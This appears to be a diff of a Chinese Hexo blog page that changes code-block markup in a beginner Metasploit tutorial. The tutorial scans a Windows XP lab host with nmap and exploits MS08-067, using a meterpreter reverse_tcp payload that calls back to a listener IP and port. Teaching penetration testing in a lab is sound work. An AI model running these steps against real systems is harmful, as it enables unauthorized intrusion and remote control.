@@ -6,8 +6,8 @@
     <meta charset="utf-8">
     <meta name="keywords" content="渗透测试(5), Hexo">
     <meta name="description" content="渗透攻击Metasploit基础Metasploit是一个集成了多个漏洞测试工具的框架。Metaslpoit在kali中已经内置，启动只需在终端输入以下命令：
-1msfconsole
-启动后显示的模板如下：第一行给出当前Metasploit">
+msfconsole
+启动后显示的模板如下：第一行给出当前Metasploit的">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -30,7 +30,7 @@
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
 <body>
@@ -428,7 +428,7 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><h3 id="Metasploit基础"><a href="#Metasploit基础" class="headerlink" title="Metasploit基础"></a>Metasploit基础</h3><p>Metasploit是一个集成了多个漏洞测试工具的框架。Metaslpoit在kali中已经内置，启动只需在终端输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">msfconsole</code></pre>
 <p>启动后显示的模板如下：<br><img src="https://i.postimg.cc/v8Px4Y9k/1.jpg" alt=""><br>第一行给出当前Metasploit的版本，其中包含了7个模块：1949个exploits，1089个auxiliary,334个posts，558个payloads,<br>45个encoders,10个nops，7个evasion</p>
 <h4 id="常用模块的作用"><a href="#常用模块的作用" class="headerlink" title="常用模块的作用"></a>常用模块的作用</h4><ul>
 <li>漏洞渗透模块(exploits)：用于发现漏洞后对漏洞进行利用。每一个模块对应着一个漏洞，发现了目标的漏洞后，我们无需知道漏洞是怎样产生的，甚至无需会编程，只需要知道漏洞的名字，然后执行对应的漏洞模块，就可以实现对目标的入侵。</li>
@@ -438,7 +438,7 @@
 <li>evasion模块：创建反杀毒软件的木马(绕过杀毒软件)</li>
 </ul>
 <h4 id="Metasploit命令的分类"><a href="#Metasploit命令的分类" class="headerlink" title="Metasploit命令的分类"></a>Metasploit命令的分类</h4><p>启动metasploit后在msf&gt;后输入以下命令会显示系统提供的命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">help</span></code></pre>
 <ul>
 <li>核心命令(core command)</li>
 <li>模块命令(module command)</li>
@@ -448,29 +448,34 @@
 <li>登录凭证后台命令(credentials backend command)</li>
 </ul>
 <h3 id="使用Metasploit对操作系统进行攻击"><a href="#使用Metasploit对操作系统进行攻击" class="headerlink" title="使用Metasploit对操作系统进行攻击"></a>使用Metasploit对操作系统进行攻击</h3><p>使用namp对WindowsXP系统进行漏洞扫描：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- --script vuln --script-args unsafe 192.168.75.130</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">nmap -sV -p- --script vuln --script-args unsafe 192.168.75.130</code></pre>
 <p>上诉IP地址为WindowsXP的IP地址，得到的结果如图所示：<br><img src="https://i.postimg.cc/HsVc5q9x/2.png" alt=""><br>上图显示WindowsXP有MS08_067的漏洞，下面使用Metasploit对该漏洞进行利用</p>
 <ol>
 <li><p>启动Metasploit后，使用<font color="#fb8c00">search</font>命令查看针对MS08_067的渗透模块：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms08_067</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">search ms08_067</code></pre>
 <p><img src="https://i.postimg.cc/yYtJTLLT/3.png" alt=""></p>
 </li>
 <li><p>对找到的渗透模块进行利用：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi(渗透模块的名字)</span><br></pre></td></tr></table></figure></li>
+<pre class=" language-bash"><code class="language-bash">use exploit/windows/smb/ms08_067_netapi<span class="token punctuation">(</span>渗透模块的名字<span class="token punctuation">)</span></code></pre>
+</li>
 <li><p>通过以下命令查看这个模块需要设置的参数</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">show options</code></pre>
 <p><img src="https://i.postimg.cc/K8T1ptVh/4.png" alt=""><br>由搜索结果可知我们需要对RHOST(靶机的IP地址)进行设置，其他两个值使用默认值即可</p>
 </li>
 <li><p>对参数进行设置：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 192.168.75.130 (靶机IP地址)</span><br></pre></td></tr></table></figure></li>
+<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> RHOST 192.168.75.130 <span class="token punctuation">(</span>靶机IP地址<span class="token punctuation">)</span></code></pre>
+</li>
 <li><p>加入在目标系统中完成特定任务的程序B,即攻击载荷(请参阅渗透测试(4))</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show payloads  //查看该模块可利用的攻击载荷</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp  //选择其中一个设置为攻击载荷</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">show payloads  //查看该模块可利用的攻击载荷
+<span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp  //选择其中一个设置为攻击载荷</code></pre>
 <p><font color="#fb8c00">windows/meterpreter/reverse_tcp</font>是在渗透测试(4)中所陈述的远程控制程序。</p>
 </li>
 <li><p>为攻击载荷设置参数：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> LHOST 192.168.75.129  //设置主控端IP地址</span><br><span class="line"><span class="built_in">set</span> LPORT 8888          //设置主控端的端口</span><br></pre></td></tr></table></figure></li>
+<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> LHOST 192.168.75.129  //设置主控端IP地址
+<span class="token keyword">set</span> LPORT 8888          //设置主控端的端口</code></pre>
+</li>
 <li><p>开始攻击：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<pre class=" language-bash"><code class="language-bash">exploit</code></pre>
 <p>如果出现<font color="#fb8c00">meterpreter &gt; </font>的符号则证明攻击成功，进入后渗透阶段</p>
 </li>
 </ol>
@@ -527,7 +532,7 @@
                   property="dct:title" rel="dct:type">
                     《渗透测试(5)》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/24/penetrationTest5/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/24/penetrationtest5/" property="cc:attributionName"
                rel="cc:attributionURL">
                 fightingtree
             </a> 采用
@@ -593,7 +598,7 @@
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/11/26/FTP/">
+                <a href="/2019/11/26/ftp/">
                     <div class="card-image">
                         
                         
@@ -842,7 +847,7 @@
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;
             站点总字数:&nbsp;
-                <span class="white-color">169.5k</span>
+                <span class="white-color">166.6k</span>
             
             </div>
         <div class="col s12 m8 l8 copy-right">
